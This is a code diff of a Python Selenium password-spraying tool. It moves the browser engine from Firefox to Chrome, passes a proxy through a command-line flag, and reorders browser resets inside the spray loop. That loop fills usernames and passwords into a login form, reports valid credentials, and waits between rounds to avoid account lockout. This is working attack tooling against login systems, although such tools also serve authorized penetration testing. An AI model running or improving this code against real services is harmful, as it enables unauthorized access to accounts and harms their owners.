@@ -30,17 +30,17 @@ from argparse import ArgumentParser
 from collections import OrderedDict
 
 # Import selenium packages
-from selenium.webdriver import Firefox, DesiredCapabilities
+from selenium.webdriver import Chrome
 from selenium.common.exceptions import TimeoutException, WebDriverException
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.proxy import Proxy, ProxyType
 from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.firefox.options import Options
-from selenium.webdriver.firefox.service import Service
-from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
 
-from webdriver_manager.firefox import GeckoDriverManager
+from webdriver_manager.chrome import ChromeDriverManager
 
 
 # Maspping of element XPATH's in the authentication process
@@ -71,40 +71,23 @@ class text_colors:
 class BrowserEngine:
 
     options = Options()
-    profile = FirefoxProfile()
-    driver_path = GeckoDriverManager(log_level=0).install()
+    driver_path = ChromeDriverManager(log_level=0).install()
     # Set preferences at the class level
-    options.set_preference("permissions.default.image", 2)  # Supposed to help with memory issues
-    options.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
-    options.set_preference("browser.cache.disk.enable", False)
-    options.set_preference("browser.cache.memory.enable", False)
-    options.set_preference("browser.cache.offline.enable", False)
-    options.set_preference("network.http.use-cache", False)
-    options.set_preference('intl.accept_languages', 'en-US')
+    options.add_argument("--incognito")
     options.accept_untrusted_certs = True
 
     def __init__(self, wait=5, proxy=None, headless=False):
         self.options.headless = headless
-        if headless:
-            self.options.add_argument("--headless")
         if proxy is not None:
-            print('here')
             self.set_proxy(proxy)
-        self.options.profile = self.profile
-        self.driver = Firefox(options=self.options, service=Service(self.driver_path))
+        self.driver = Chrome(options=self.options, service=Service(self.driver_path))
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
         self.wait = WebDriverWait(self.driver, wait)
 
     def set_proxy(self, proxy):
         if proxy is not None:
-            ip, port = proxy.split(":")
-            self.options.set_preference('network.proxy.type', 1)
-            self.options.set_preference('network.proxy.http', ip)
-            self.options.set_preference('network.proxy.http_port', int(port))
-            #self.options.set_preference('network.proxy.https', ip)
-            #self.options.set_preference('network.proxy.https_port', int(port))
-            self.options.update_preferences()
+            self.options.add_argument('--proxy-server=%s' % proxy)
 
     def quit(self):
         self.driver.quit()
@@ -122,7 +105,6 @@ class BrowserEngine:
         self.driver.delete_all_cookies()
 
     def get(self, url):
-        print(self.options)
         self.driver.get(url)
 
     def find_element(self, type_, value):
@@ -210,7 +192,7 @@ def lockout_reset_wait(lockout):
     sleep(lockout * 60)
 
 def reset_browser(browser, wait, proxy, headless):
-    browser.close()
+    browser.quit()
     return BrowserEngine(wait=wait, proxy=proxy)
 
 
@@ -303,7 +285,15 @@ def spray(args, username_list, password_list):
 
         for username in username_list:
 
+            if counter >= args.reset_after:
+                browser = reset_browser(browser, args.wait,
+                        args.proxy, args.headless) # Reset the browser to deal with latency issues
+                counter = 0
+
+
             print("[*] Current username: %s" % username)
+
+            counter += 1
 
             # This seems to helps with memory issues...
             browser.clear_cookies()
@@ -328,8 +318,9 @@ def spray(args, username_list, password_list):
             if not usernamefield:
                 print("%s[Error] %s%s" % (text_colors.red, "Username field not found",
                     text_colors.reset))
-            else:
-                browser.populate_element(usernamefield, username)
+                continue
+
+            browser.populate_element(usernamefield, username)
             # Find button and click it
             element = elements["button_next"]
             try:
@@ -350,7 +341,6 @@ def spray(args, username_list, password_list):
                     # Remove from list
                     username_list.remove(username)
                 invalid += 1 # Keep track so the user knows they need to run enum
-                counter += 1
 
             else:
                 # Populate the password field and click 'Sign In'
@@ -375,13 +365,7 @@ def spray(args, username_list, password_list):
                 else:
                     print("%s[Invalid Creds] %s:%s%s" % (text_colors.red, username, password, text_colors.reset))
 
-                counter += 1
 
-
-            if counter >= args.reset_after:
-                browser = reset_browser(browser, args.wait,
-                        args.proxy, args.headless) # Reset the browser to deal with latency issues
-                counter = 0
 
         # Wait for lockout period if not last password
         if index != last_index:
